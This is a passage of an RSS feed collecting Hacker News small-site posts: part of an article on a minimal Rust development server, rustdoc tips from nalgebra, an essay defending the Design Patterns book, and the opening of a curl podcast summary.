<pre><code><span>pub fn </span><span>read_header</span><span>&lt;</span><span>T</span><span>:</span><span> Read </span><span>+</span><span> Write</span><span>&gt;(</span><span>stream</span><span>: &amp;</span><span>mut</span><span> T</span><span>) -&gt; </span><span>Vec</span><span>&lt;</span><span>u8</span><span>&gt; {
    </span><span>let mut</span><span> buffer </span><span>= </span><span>Vec</span><span>::</span><span>new</span><span>();
    </span><span>let mut</span><span> reader </span><span>= </span><span>std</span><span>::</span><span>io</span><span>::</span><span>BufReader</span><span>::</span><span>new</span><span>(</span><span>stream</span><span>);
    </span><span>loop </span><span>{</span><span>
        reader</span><span>.</span><span>read_until</span><span>(</span><span>b</span><span>'\n', &amp;</span><span>mut</span><span> buffer</span><span>).</span><span>unwrap</span><span>();
        </span><span>// Read until end of header.
        </span><span>if </span><span>&amp;</span><span>buffer</span><span>[</span><span>buffer</span><span>.</span><span>len</span><span>() - </span><span>4</span><span>..] == </span><span>b</span><span>"\r\n\r\n" {
            </span><span>break</span><span>;
        }
    }</span><span>
    buffer
</span><span>}
</span></code></pre>
<p>It is assumed that all requests sent to the server are <code>GET</code> requests, and <code>devserver</code> treats them as such.</p>
<p>Some string wrangling is done to get the correct path and file extension:</p>
<pre><code><span>let</span><span> request_string </span><span>= </span><span>str</span><span>::</span><span>from_utf8</span><span>(&amp;</span><span>buffer</span><span>).</span><span>unwrap</span><span>();

</span><span>if</span><span> request_string</span><span>.</span><span>is_empty</span><span>() {
    </span><span>return</span><span>;
}
</span><span>// Split the request into different parts.
</span><span>let mut</span><span> parts </span><span>=</span><span> request_string</span><span>.</span><span>split</span><span>(' ');

</span><span>let</span><span> _method </span><span>=</span><span> parts</span><span>.</span><span>next</span><span>().</span><span>unwrap</span><span>().</span><span>trim</span><span>();
</span><span>let</span><span> path </span><span>=</span><span> parts</span><span>.</span><span>next</span><span>().</span><span>unwrap</span><span>().</span><span>trim</span><span>();
</span><span>let</span><span> _http_version </span><span>=</span><span> parts</span><span>.</span><span>next</span><span>().</span><span>unwrap</span><span>().</span><span>trim</span><span>();

</span><span>// Replace white space characters with proper whitespace.
</span><span>let</span><span> path </span><span>=</span><span> path</span><span>.</span><span>replace</span><span>("</span><span>%20</span><span>", " ");
</span><span>let</span><span> path </span><span>= </span><span>if</span><span> path</span><span>.</span><span>ends_with</span><span>("</span><span>/</span><span>") {
    </span><span>Path</span><span>::</span><span>new</span><span>(</span><span>root_path</span><span>).</span><span>join</span><span>(</span><span>Path</span><span>::</span><span>new</span><span>(&amp;</span><span>format!</span><span>(
        "</span><span>{}{}</span><span>",</span><span>
        path</span><span>.</span><span>trim_start_matches</span><span>('</span><span>/</span><span>'),
        "</span><span>index.html</span><span>"
    )))
} </span><span>else </span><span>{
    </span><span>Path</span><span>::</span><span>new</span><span>(</span><span>root_path</span><span>).</span><span>join</span><span>(</span><span>path</span><span>.</span><span>trim_matches</span><span>('</span><span>/</span><span>'))
};

</span><span>let</span><span> extension </span><span>=</span><span> path</span><span>.</span><span>extension</span><span>().</span><span>and_then</span><span>(</span><span>OsStr</span><span>::</span><span>to_str</span><span>);

</span><span>// If no extension is specified assume html
</span><span>let</span><span> path </span><span>= </span><span>if</span><span> extension </span><span>== </span><span>None </span><span>{</span><span>
    path</span><span>.</span><span>with_extension</span><span>("</span><span>html</span><span>")
} </span><span>else </span><span>{</span><span>
    path</span><span>.</span><span>to_owned</span><span>()
};
</span><span>let</span><span> extension </span><span>=</span><span> extension</span><span>.</span><span>unwrap_or</span><span>("</span><span>html</span><span>");
</span></code></pre>
<p><code>devserver</code> then finds the file on the disk, the file extension is associated with a MIME type (Also known as a 'Media Type'), and the HTTP response is written to the return stream:</p>
<pre><code><span>let</span><span> content_type </span><span>= </span><span>extension_to_mime_impl</span><span>(</span><span>Some</span><span>(</span><span>extension</span><span>));
</span><span>let</span><span> response </span><span>= </span><span>format!</span><span>(
    "</span><span>HTTP/1.1 200 OK</span><span>\r\n</span><span>Content-type: {}</span><span>\r\n</span><span>Content-Length: {}</span><span>\r\n\r\n",</span><span>
    content_type</span><span>,</span><span> content_length
</span><span>);

</span><span>let mut</span><span> bytes </span><span>=</span><span> response</span><span>.</span><span>as_bytes</span><span>().</span><span>to_vec</span><span>();</span><span>
bytes</span><span>.</span><span>append</span><span>(&amp;</span><span>mut</span><span> file_contents</span><span>);</span><span>
stream</span><span>.</span><span>write_all</span><span>(&amp;</span><span>bytes</span><span>).</span><span>unwrap</span><span>();
</span></code></pre>
<p>It's all shockingly simple for how well it works. This handles most cases I've thrown at it and yet it's only a few lines of code!</p>
<h3 id="automatic-reload">Automatic Reload</h3>
<p>I use <code>devserver</code> to develop interactive game-like content, <a href="https://ianjk.com/rust-gamejam/">like the Rust game I made for Ludum Dare</a>, and quick iteration times are critical for similar creative work.</p>
<p>It's a great experience to make changes to a file and have it automatically update in the browser by the time you alt-tab to it.</p>
<p>There are two parts to this problem:</p>
<ul>
<li>Detect file and folder changes</li>
<li>Notify the browser to refresh</li>
</ul>
<p>Unfortunately watching for file and folder changes across platforms is finicky.</p>
<p>Fortunately the <a href="https://github.com/notify-rs/notify">Notify</a> crate already put in the hard work to figure it all out and it is a small enough dependency it doesn't hurt <code>devserver</code>'s minimalist build goals too much.</p>
<p>Notifying the browser that it needs to refresh requires an open connection to the browser, or some sort of continuous polling. Continous polling felt too heavy handed, so that was ruled out.</p>
<p>The approach I settled on was using a WebSocket to notify the browser that the a file had changed. Initially I planned on sending the new file to the browser so it could reload just that file, but I later decided to just settle for the "Good enough" solution of refreshing the browser.</p>
<p>I evaluated various WebSocket libraries to use. <a href="https://crates.io/crates/tungstenite">Tungstenite</a> seemed like a good solution, but sadly when I tried it out it nearly doubled <code>devserver</code>'s clean build times, so I decided to consider other alternatives.</p>
<p>I wasn't too fond of the idea, but perhaps if I could implement a spartan HTTP response I could also create a spartan WebSocket implementation? All <code>devserver</code> needed was just enough to signal the server somehow. So I started reading resources online about WebSockets and consulting the spec.</p>
<p>The WebSocket standard requires a seemingly arbitrarily formatted response to declare "Yes I really am a WebSocket" which is handled by the following code:</p>
<pre><code><span>// Perform a ceremony of getting the SHA1 hash of the sec_websocket_key joined with
// an arbitrary string and then take the base 64 encoding of that.
</span><span>let</span><span> sec_websocket_accept </span><span>= </span><span>format!</span><span>(
    "</span><span>{}{}</span><span>",</span><span>
    sec_websocket_key</span><span>, "</span><span>258EAFA5-E914-47DA-95CA-C5AB0DC85B11</span><span>"
);
</span><span>let mut</span><span> hasher </span><span>= </span><span>Sha1</span><span>::</span><span>new</span><span>();</span><span>
hasher</span><span>.</span><span>input</span><span>(</span><span>sec_websocket_accept</span><span>.</span><span>as_bytes</span><span>());
</span><span>let</span><span> result </span><span>=</span><span> hasher</span><span>.</span><span>result</span><span>();
</span><span>let</span><span> bytes </span><span>= </span><span>base64</span><span>::</span><span>encode</span><span>(&amp;</span><span>result</span><span>);

</span><span>format!</span><span>("</span><span>HTTP/1.1 101 Switching Protocols</span><span>\r\n</span><span>Upgrade: websocket</span><span>\r\n</span><span>Connection: Upgrade</span><span>\r\n</span><span>Sec-WebSocket-Accept: {}</span><span>\r\n\r\n",</span><span>bytes</span><span>)

</span></code></pre>
<p>The above code introduces two direct dependencies: the <a href="https://crates.io/crates/sha-1"><code>sha-1</code></a> crate and the <a href="https://crates.io/crates/base64">`base64</a> crate, both required for the string formatting ceremony.</p>
<p>Once the connection is opened a blank message is sent along the WebSocket whenever a file changes. The web page refreshes whenever it receives any message from the server's WebSocket:</p>
<pre><code><span>Ok</span><span>(</span><span>event</span><span>) =&gt; {
    </span><span>let </span><span>(</span><span>_path</span><span>,</span><span> refresh</span><span>) = </span><span>match</span><span> event </span><span>{
        </span><span>/* Various events from Notify about file and folder changes */
    </span><span>};

    </span><span>if</span><span> refresh </span><span>{
        </span><span>// A blank message is sent triggering a refresh on any change.
        // If this message fails to send, then likely the socket has been closed.
        </span><span>if </span><span>send_websocket_message</span><span>(&amp;</span><span>stream</span><span>, "").</span><span>is_err</span><span>() {
            </span><span>break</span><span>;
        };
    }
}
</span></code></pre>
<p><code>devserver</code> injects the following snippet of Javascript into each <code>.html</code> file served to establish the WebSocket connection:</p>
<pre><code><span>// This code is inserted by devserver to enable reloading.
</span><span>const </span><span>socket </span><span>= new </span><span>WebSocket</span><span>("</span><span>ws://</span><span>" + </span><span>window</span><span>.</span><span>location</span><span>.</span><span>hostname </span><span>+ "</span><span>:8129</span><span>");
</span><span>socket</span><span>.</span><span>addEventListener</span><span>('</span><span>open</span><span>', </span><span>function </span><span>(</span><span>event</span><span>) { </span><span>console</span><span>.</span><span>log</span><span>("</span><span>Reloading enabled!</span><span>"); });
</span><span>socket</span><span>.</span><span>addEventListener</span><span>('</span><span>message</span><span>', </span><span>function </span><span>(</span><span>event</span><span>) { </span><span>location</span><span>.</span><span>reload</span><span>(); });
</span></code></pre>
<p>The code is appended in a <code>&lt;script&gt;</code> tag to the end of the document, and even though that's not the correct spot for a <code>&lt;script&gt;</code> tag the browsers handle it totally fine without error! Hooray for lenient browsers!</p>
<p>So with the combination of the <code>Notify</code> crate and a MacGyver-ed WebSocket implementation automatic page reloading works with only a small hit to <code>devserver</code>'s build times.</p>
<p>I could never remember (even though it's my own code!) if the flag was "--reload" or "--refresh" so <code>devserver</code> accepts both so I can never make that error again. Eventually I just made the flag on by default because I was using it every time I ran <code>devserver</code>.</p>
<h2 id="https">HTTPS</h2>
<p>Many development servers require configuring a certificate for HTTPS support, which can be a pain if all you want to do is locally develop for web APIs that require HTTPS (as WebXR does).</p>
<p><code>devserver</code> is very much <strong>not</strong> an acceptable production server. This lets <code>devserver</code> cut corners to make the experience of local development simpler.</p>
<p>Instead of using a valid certificate <code>devserver</code> just uses an invalid hardcoded security certificate. Web browsers warn that the certificate is invalid, but it is easy to ignore the warnings. You should <em>not</em> do this normally, but for local development it can be OK.</p>
<p>This is absolutely my least favorite part of <code>devserver</code>, and it's something I'd like to change in the future if possible.</p>
<p>It's not an elegant solution, but it allows <code>devserver</code> to run as a single command and support both https and http with zero configuration.</p>
<p>The <a href="https://crates.io/crates/native-tls"><code>native-tls</code></a> crate is used to handle opening the secure HTTPS socket. <code>native-tls</code> was a great choice for <code>devserver</code> because it handles the complex requirements of HTTPS but avoids lengthy build times by using the native platform TLS implementations.</p>
<p><code>devserver</code> handles both HTTPS and HTTP connections at the same time without a setting by checking which type an incoming connection is.</p>
<p>HTTP requests always begin with a verb like <code>GET</code>, but HTTPS requests always begin with a number. By peeking the first few bytes <code>devserver</code> can decide which path to take:</p>
<pre><code><span>let mut</span><span> buf </span><span>= [</span><span>0</span><span>; </span><span>2</span><span>];</span><span>
stream</span><span>.</span><span>peek</span><span>(&amp;</span><span>mut</span><span> buf</span><span>).</span><span>expect</span><span>("</span><span>peek failed</span><span>");

</span><span>let</span><span> is_https </span><span>=
    !((</span><span>buf</span><span>[</span><span>0</span><span>] as </span><span>char</span><span>).</span><span>is_alphabetic</span><span>() &amp;&amp; (</span><span>buf</span><span>[</span><span>1</span><span>] as </span><span>char</span><span>).</span><span>is_alphabetic</span><span>());

</span><span>if</span><span> …</span></code></pre></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://ianjk.com/devserver/">https://ianjk.com/devserver/</a></em></p>]]>
            </description>
            <link>https://ianjk.com/devserver/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24515095</guid>
            <pubDate>Fri, 18 Sep 2020 10:40:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Taming Nalgebra's Rustdoc]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24515043">thread link</a>) | @lukastyrychtr
<br/>
September 18, 2020 | https://jack.wrenn.fyi/blog/rustdocing-nalgebra/ | <a href="https://web.archive.org/web/*/https://jack.wrenn.fyi/blog/rustdocing-nalgebra/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    <p><a href="https://nalgebra.org/">Nalgebra</a> is a powerhouse of functionality, but its documentation can be overwhelmingâ€”the <a href="https://nalgebra.org/rustdoc/nalgebra/base/struct.Matrix.html">documentation for <code>Matrix</code></a> lists over <em>600</em> methods. Your documentation endeavors might not be <em>quite</em> so overwhelming, but you still could benefit from these <strong>three tricks</strong> nalgebra uses to improve its docs.</p>
<h2 id="documenting-type-aliases">Documenting Type Aliases</h2>
<p><strong>TIP: Write <code>impl</code>s and documentation on type aliases.</strong></p>
<p>The <a href="https://nalgebra.org/rustdoc/nalgebra/base/struct.Matrix.html"><code>Matrix</code></a> <code>struct</code> type is at the heart of nalgebra's functionality. It is generically parametrized by dimension, so the same outer type is used to encode matrices of all sizes. A vector of dimension <code>R</code>, for instance, is merely a <code>Matrix</code> of <code>R</code> rows and <code>U1</code> columns.</p>
<p>From a programming ergonomics perspective, you might think it'd be convenient to codify this with a type alias; e.g.:</p>
<pre><code><span>type </span><span>Vector</span><span>&lt;</span><span>N, D, S</span><span>&gt; = </span><span>Matrix&lt;N, D, U1, S&gt;;
</span></code></pre>
<p>...and you'd be right; nalgebra defines just such a type alias!</p>
<p>But type aliases aren't <em>just</em> programming shorthand; they can be used to improve documentation, too: <strong>When an inherent <code>impl</code> is written in terms of a type alias, the documentation of that <code>impl</code> <em>also</em> appears of the documentation page of that type alias.</strong></p>
<p>Sure enough, if you visit nalgebra's <a href="https://docs.rs/nalgebra/0.22.0/nalgebra/base/type.Vector.html"><code>Vector</code> documentation page</a> type alias, you'll see <em>only</em> the methods specific to vectors:</p>

<p>Unfortunately, this same documentation is <a href="https://docs.rs/nalgebra/0.21.1/nalgebra/base/struct.Matrix.html#impl-1"><em>also</em> rendered on the page for <code>Matrix</code></a> and <em>without</em> the type aliases. This is why the documentation for the base <code>Matrix</code> type is so long. :-(</p>
<h2 id="coalescing-impls">Coalescing <code>impl</code>s</h2>
<p><strong>TIP: Reduce repetition by grouping methods with the same bounds into the a single bounded <code>impl</code>.</strong></p>
<p>One of nalgebra's cooler ergonomic shortcuts is <a href="https://en.wikipedia.org/wiki/Swizzling_(computer_graphics)"><em>vector swizzling</em></a>. A swizzle lets you build a new vector from some ordering and subset of the components of another vector. For instance, <code>vec.xyx()</code> constructs a new, three-dimensional vector comprised of the <code>x</code>, <code>y</code> and <code>x</code> components of <code>vec</code>.</p>
<p>Supporting this shortcut requires generating a <em>lot</em> of methods. A couple years ago, the documentation of these methods looked like this:</p>

<p><strong>This documentation has a very poor signal-to-noise ratio.</strong> The preamble</p>
<pre><code><span>impl</span><span>&lt;N: Scalar, D: DimName, S: Storage&lt;N, D&gt;&gt; Vector&lt;N, D, S&gt;
</span></code></pre>
<p>is repeated for <em>every</em> swizzling method, and each individual swizzling method has its <em>own</em> <code>where</code> bound documenting its dimensionality requirements.</p>
<p>Nearly all of this repetition was eliminated with a <a href="https://github.com/dimforge/nalgebra/pull/485/files#diff-425bf3710eefe907a4f8369b92cd4966">minor change</a> to the macro generating these methods:</p>

<p><strong>What changed?</strong> The old macro generated an <code>impl</code> for each swizzling method:</p>
<pre><code><span>impl</span><span>&lt;N: Scalar, D: DimName, S: Storage&lt;N, D&gt;&gt; Vector&lt;N, D, S&gt; {
    </span><span>pub fn </span><span>xx</span><span>(</span><span>&amp;</span><span>self</span><span>) -&gt; Vector2&lt;N&gt;
    </span><span>where
        D::</span><span>Value: Cmp&lt;typenum::U0, Output=Greater&gt;
    { </span><span>... </span><span>}
}

</span><span>impl</span><span>&lt;N: Scalar, D: DimName, S: Storage&lt;N, D&gt;&gt; Vector&lt;N, D, S&gt; {
    </span><span>pub fn </span><span>xxx</span><span>(</span><span>&amp;</span><span>self</span><span>) -&gt; Vector3&lt;N&gt;
    </span><span>where
        D::</span><span>Value: Cmp&lt;typenum::U0, Output=Greater&gt;
    { </span><span>... </span><span>}
}

</span><span>impl</span><span>&lt;N: Scalar, D: DimName, S: Storage&lt;N, D&gt;&gt; Vector&lt;N, D, S&gt; {
    </span><span>pub fn </span><span>xy</span><span>(</span><span>&amp;</span><span>self</span><span>) -&gt; Vector2&lt;N&gt;
    </span><span>where
        D::</span><span>Value: Cmp&lt;typenum::U1, Output=Greater&gt;
    { </span><span>... </span><span>}
}

</span><span>/* and so on */
</span></code></pre>
<p>The new macro groups the methods into one of just three <code>impl</code>s depending on their dimensionality requirements:</p>
<pre><code><span>// Swizzling methods for Vectors of dimension &gt; 0
</span><span>impl</span><span>&lt;N: Scalar, D: DimName, S: Storage&lt;N, D&gt;&gt; Vector&lt;N, D, S&gt;
</span><span>where
    D::</span><span>Value: Cmp&lt;typenum::U0, Output=Greater&gt;
{
    </span><span>pub fn </span><span>xx</span><span>(</span><span>&amp;</span><span>self</span><span>) -&gt; Vector2&lt;N&gt;
    </span><span>where
        D::</span><span>Value: Cmp&lt;typenum::U0, Output=Greater&gt;
    { </span><span>... </span><span>}

    </span><span>pub fn </span><span>xxx</span><span>(</span><span>&amp;</span><span>self</span><span>) -&gt; Vector3&lt;N&gt;
    </span><span>where
        D::</span><span>Value: Cmp&lt;typenum::U0, Output=Greater&gt;
    { </span><span>... </span><span>}
}

</span><span>// Swizzling methods for Vectors of dimension &gt; 1
</span><span>impl</span><span>&lt;N: Scalar, D: DimName, S: Storage&lt;N, D&gt;&gt; Vector&lt;N, D, S&gt;
</span><span>where
    D::</span><span>Value: Cmp&lt;typenum::U1, Output=Greater&gt;
{
    </span><span>pub fn </span><span>xy</span><span>(</span><span>&amp;</span><span>self</span><span>) -&gt; Vector2&lt;N&gt;
    { </span><span>... </span><span>}

    </span><span>/* and so on */
</span><span>}

</span><span>// Swizzling methods for Vectors of dimension &gt; 2
</span><span>impl</span><span>&lt;N: Scalar, D: DimName, S: Storage&lt;N, D&gt;&gt; Vector&lt;N, D, S&gt;
</span><span>where
    D::</span><span>Value: Cmp&lt;typenum::U2, Output=Greater&gt;
{
    </span><span>pub fn </span><span>xz</span><span>(</span><span>&amp;</span><span>self</span><span>) -&gt; Vector2&lt;N&gt;
    { </span><span>... </span><span>}

    </span><span>/* and so on */
</span><span>}
</span></code></pre>
<p>...and rustdoc faithfully adheres to this organization when generating nalgebra's documentation!</p>
<p><strong>If you are generating <code>impl</code>s via a macro, check if your macro could be tweaked to group similar methods into the same <code>impl</code>!</strong></p>
<h2 id="documenting-impls">Documenting <code>impl</code>s</h2>
<p><strong>TIP: You can write documentations on individual <code>impl</code>s!</strong></p>
<p>Like Rust's slices, nalgebra's arrays allow for overloaded indexing; e.g.:</p>
<pre><code><span>let</span><span> matrix </span><span>= </span><span>Matrix3::new(</span><span>0</span><span>, </span><span>3</span><span>, </span><span>6</span><span>,
                          </span><span>1</span><span>, </span><span>4</span><span>, </span><span>7</span><span>,
                          </span><span>2</span><span>, </span><span>5</span><span>, </span><span>8</span><span>);

</span><span>// index a particular element
</span><span>assert_eq!(matrix.</span><span>index</span><span>((</span><span>0</span><span>, </span><span>0</span><span>)), </span><span>&amp;</span><span>0</span><span>);

</span><span>// select a range of rows and all columns
</span><span>assert!(matrix.</span><span>index</span><span>((</span><span>1</span><span>..</span><span>3</span><span>, </span><span>..</span><span>))
    .</span><span>eq</span><span>(</span><span>&amp;</span><span>Matrix2x3::new(</span><span>1</span><span>, </span><span>4</span><span>, </span><span>7</span><span>,
                        </span><span>2</span><span>, </span><span>5</span><span>, </span><span>8</span><span>)));
</span></code></pre>
<p>...and these overloaded index types are usable with a whole suite of associated methods: <code>index</code>, <code>index_mut</code>, <code>get</code>, <code>get_mut</code>, <code>get_unchecked</code> and <code>get_unchecked_mut</code>. The same indexing types can be used on each of these methodsâ€”they only differ in their fallibility, mutability, and safety.</p>
<p>These six methods are grouped into the same <code>impl</code>. The documentation for the individual methods focuses just on their differences. Their similarities (namely, the different kinds of indexes which can be used) are documented <em>on this shared <code>impl</code></em>:</p>

<p><strong>If you have thematically similar methods, you can group them into their own <code>impl</code>, and write rustdoc on that <code>impl</code>!</strong></p>
<p>Concretely:</p>
<pre><code><span>/// # Indexing Operations
/// [documentation about indexing as a whole]
</span><span>impl</span><span>&lt;N: Scalar, R: Dim, C: Dim, S: Storage&lt;N, R, C&gt;&gt; Matrix&lt;N, R, C, S&gt; {
    </span><span>/// [documentation *just* for `get`]
    </span><span>#[</span><span>inline</span><span>]
    </span><span>pub fn </span><span>get</span><span>&lt;</span><span>'a</span><span>, I&gt;(</span><span>&amp;</span><span>'a </span><span>self</span><span>, </span><span>index</span><span>: I) -&gt; </span><span>Option</span><span>&lt;</span><span>I::</span><span>Output&gt;
    </span><span>where</span><span>
        I: MatrixIndex&lt;</span><span>'a</span><span>, N, R, C, S&gt;,
    { </span><span>... </span><span>}

    </span><span>/// [documentation *just* for `get_mut`]
    </span><span>#[</span><span>inline</span><span>]
    </span><span>pub fn </span><span>get_mut</span><span>&lt;</span><span>'a</span><span>, I&gt;(</span><span>&amp;</span><span>'a </span><span>self</span><span>, </span><span>index</span><span>: I) -&gt; </span><span>Option</span><span>&lt;</span><span>I::</span><span>Output&gt;
    </span><span>where</span><span>
        S: StorageMut&lt;N, R, C&gt;,
        I: MatrixIndexMut&lt;</span><span>'a</span><span>, N, R, C, S&gt;,
    { </span><span>... </span><span>}

    </span><span>/* and so on */
</span><span>}
</span></code></pre>
  </div></div>]]>
            </description>
            <link>https://jack.wrenn.fyi/blog/rustdocing-nalgebra/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24515043</guid>
            <pubDate>Fri, 18 Sep 2020 10:33:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Don't hate the book because you don't use it]]>
            </title>
            <description>
<![CDATA[
Score 15 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24514953">thread link</a>) | @aseure
<br/>
September 18, 2020 | https://aseure.fr/articles/2020-09-18-dont-hate-the-book-because-you-dont-use-it/ | <a href="https://web.archive.org/web/*/https://aseure.fr/articles/2020-09-18-dont-hate-the-book-because-you-dont-use-it/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  
<h3>
  18 September 2020
</h3>


  <p>In a few months, I’ll celebrate my fifth year as a professional - understand paid - software engineer. I find this role to be a right balance of technical skills, human relationships and it fulfils my curiosity. As time goes by, I’m also starting to be disappointed by some of its negative aspects. While it doesn’t prevent me from sleeping, I think an effort could be made to challenge some lousy and short-sighted comments we see daily on social platforms.</p>
<p>Today, I’d like to talk about <a href="https://www.amazon.com/Design-Patterns-Object-Oriented-Addison-Wesley-Professional-ebook/dp/B000SEIBB8">Design Patterns: Elements of Reusable Object-Oriented Software</a>, a book written by Erich Gamma, Richard Helm, Ralph Johnson, and John Vlissides, famously known as the <em>Gang of Four</em>. If you never read it: this is a fundamental programming book describing programming abstractions published in 1994. The date is essential here, but we’ll come to that later.</p>
<p>This book has recently been discussed by many, due to <a href="https://twitter.com/unclebobmartin/status/1306581616983183361">a recent tweet from Robert. C. Martin aka Uncle Bob</a>. Long story short, telling a massive audience that book X is great, and treating people who consider it outdated as “foolish” does not end well.</p>
<p>While I disagree with the tone here, I’d like to focus on the negative comments which followed, including but not limited to:</p>
<ul>
<li>the book is outdated</li>
<li>its concepts are outdated</li>
<li>its authors said it’s outdated</li>
<li>the book is only focused on mid-90s C++ developers</li>
<li>no one ever used the “flyweight” design pattern</li>
<li>the book is not even readable</li>
<li>its abstractions make code unreadable</li>
</ul>
<p>First of all, let’s get back to 1994. I was two at the time. All Internet websites could probably fit on a floppy disk, Jeff Bezos founded Amazon, Rasmus Lerdorf was only starting to work on its <em>Personal Home Page/Forms Interpreter</em> CGI C program, and Larry Page and Sergey Brin would only start their research project for a web search engine two years later. The biggest technology companies were IBM, Hewlett-Packard, Motorola and Xerox, which mostly sat behind the oil, car, and food industries. Programming existed, but it wasn’t the same field as we know it today. Tech companies were a few, and I assume a lot of programmers were working in other industries. Being a professional in this sector was arguably more difficult then, and knowledge was not as easily accessible as it is today. This book was published in a world where programming started to spread in many industries. It surely was a very good resource, to try to apply its concepts, and see what works and what doesn’t. The authors were literally inventing the field at the time: Erich Gamma, for instance, teamed up with Kent Beck to create the Java JUnit test framework just a few years later, which hugely helped to popularise testing.</p>
<p>My point is: let’s remind ourselves we stand on the shoulders of many people who tried and experimented a lot at the time. We too often take for granted the knowledge and productivity we have today. On top of that, let’s not be disrespectful towards the previous generation. My father and my grandfather both work(ed) as electricians: never did my father complain about his father’s tools or habits before him. He learned them and perfected them with modern knowledge.</p>
<p>Now about the book in itself. While I agree with people saying that some design patterns are too abstract, I strongly disagree with the ones saying the whole book is outdated. Should you develop in a OO language today, such as Java, C++, Python or Ruby, or even more notably, develop a framework or a tool <em>for</em> developers, I think this book is still highly relevant today.</p>
<p>Here are my top picks from the book and why I chose them.</p>
<p><strong>Builder:</strong> because in OOP, objects often hold too much data in them, you need to control how to instantiate them properly. Even with overloaded constructors, data validation at instantiation can become messy. Do you like your testing framework using a <em>fluent interface</em> with method chaining (<code>assert(...).not().equalTo(...)</code>)? Guess what, it’s directly inspired by the builder design pattern.</p>
<p><strong>Prototype:</strong> I often hear people complaining about how complicated JavaScript is. While I don’t think this language makes it easy for the developer to write non error-prone code, I better understood the language via the lens of its prototype-based nature, precisely described by the prototype design pattern.</p>
<p><strong>Most of the structural patterns:</strong> While everyone is focused on the bad parts of OOP, namely inheritance, all those design patterns are focused on composability. If you want to be cool nowadays, you could say you prefer “composition over inheritance”. Well, if you think composition is only about embedding objects in each other, you should read the part of structural design patterns. For instance, you probably know decorators from Python or annotations in Java/C#, they derive from the decorator design pattern.</p>
<p><strong>Chain of Responsibility:</strong> I think we can all agree on how great it is to use and implement a middleware in our modern web framework. Just use or write functions which take a <em>next</em> handler, a request object. Pass it to your web framework instance via a <code>.use(...)</code> method and you’re done. This is what the Chain of Responsibility pattern is all about. All Rails, Django, and Laravel developers knew that was NIH.</p>
<p><strong>Iterator:</strong> This one seems obvious now, perhaps not so much at a time where iterating on arrays with pointer arithmetic was common. Today, iterators are even buried behind standard libraries to implement even higher abstract functionalities, but they are still there. I don’t see a more universal way to implement, with the same public API, a traversal of an array, a tree, or a graph (they are better ways of iterating those last data structures though).</p>
<p><strong>Observer:</strong> For this last one, here is the verbatim definition from the book: “Define a one-to-many dependency between objects so that when one object changes state, all its dependents are notified and updated automatically”. Now, if we take a look at some modern technologies, doesn’t this resonate with PubSub models or React hooks for instance?</p>
<p>To conclude, I’m not saying the book is not old, quite the opposite: you can feel it when it takes as examples from 90s user interfaces. I’m merely advocating that our industry and its workers have changed a lot in the last 30 years, dare I say even more than in any other industry. But this should not be an excuse to sweep away years of meticulous R&amp;D and documentation, on which our modern tools still rely on nowadays, and the people behind it.</p>
<p>Because a lot of people complained that they were never able to finish the book, here is an extract from the end, section “What to Expect from Design Patterns”, page 351:</p>
<blockquote>
<p>It’s possible to argue that this book hasn’t accomplished much. After all, it doesn’t present any algorithms or programming techniques that haven’t been used before. […] it just documents existing designs. You could conclude that it makes a reasonable tutorial, perhaps, but it certainly can’t offer much to an experienced object-oriented designer.</p>
<p>We hope you think differently. Cataloging design patterns is important. It gives us standard names and definitions for the techniques we use. If we don’t study design patterns in software, we won’t be able to improve them, and it’ll be harder to come up with new ones.</p>
<p>This book is only a start.</p>
</blockquote>

</div></div>]]>
            </description>
            <link>https://aseure.fr/articles/2020-09-18-dont-hate-the-book-because-you-dont-use-it/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24514953</guid>
            <pubDate>Fri, 18 Sep 2020 10:14:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Security Headlines: cURL special with Daniel Stenberg [audio]]]>
            </title>
            <description>
<![CDATA[
Score 38 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24514932">thread link</a>) | @devrustr
<br/>
September 18, 2020 | https://blog.firosolutions.com/2020/09/security-headlines-curl-special/ | <a href="https://web.archive.org/web/*/https://blog.firosolutions.com/2020/09/security-headlines-curl-special/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  





<p><img alt="curl security headlines podcast" src="https://blog.firosolutions.com/shcurl.png"></p><h3 id="summary">Summary:</h3>

<p>In this episode of Security Headlines, we jump into curl with<br>
its founder and maintainer Daniel Stenberg.<br>
We talk security, CI systems, creation of curl, Fuzzing, IRC bots<br>
and a lot more!</p>

<p>Relax, Tune in and enjoy this episode of Security Headlines:</p>







<p><a href="https://anchor.fm/firo-solutions/episodes/Curl-special-with-Daniel-Stenberg-ejqn0g">https://anchor.fm/firo-solutions/episodes/Curl-special-with-Daniel-Stenberg-ejqn0g</a></p>

<p>Few software developers never even get near to having one<br>
of their projects being picked up by a larger community.</p>

<p>A project that started as a currency plugin to an IRC bot.<br>
Spun off and ended up becoming bigger and bigger resulting in being
adopted by over 10 billion devices.  Well, this project is called<br>
curl!  Curl is known to be the stable swizz army knife that can<br>
be used for making various types of transfer requests.</p>

<p>Need to download a file? Curl is here for you<br>
Need to test a socks5 proxy? Curl is here for you<br>
Need to download an ezine over Gopher? Curl is here for you<br>
Need to test a unix socket? Curl is here for you</p>

<p>In this episode of Security Headlines, we are joined by Daniel<br>
Stenberg who is the founder and maintainer of Curl.<br>
He has even been awarded a gold medal by the Swedish king for<br>
his work with Curl.</p>



<p><img alt="curl Daniel stenberg King medal" src="https://blog.firosolutions.com/daniel-king.jpg"></p><p>The curl codebase is around 100 000 lines of C code, filled with<br>
hidden gems such as a libcurl code generator that creates a template<br>
based on the command line arguments you give it.</p>

<p>One of curl’s many features is the –libcurl option which<br>
takes the commmand you give curl and generate a C program that use<br>
libcurl with the same functionally, you can even port it to other<br>
programming languages with a similar syntax and use it with libcurl’s<br>
bindings.</p>

<pre><code>$ curl https://blog.firosolutions.com --libcurl example.c   
$ head example.c 
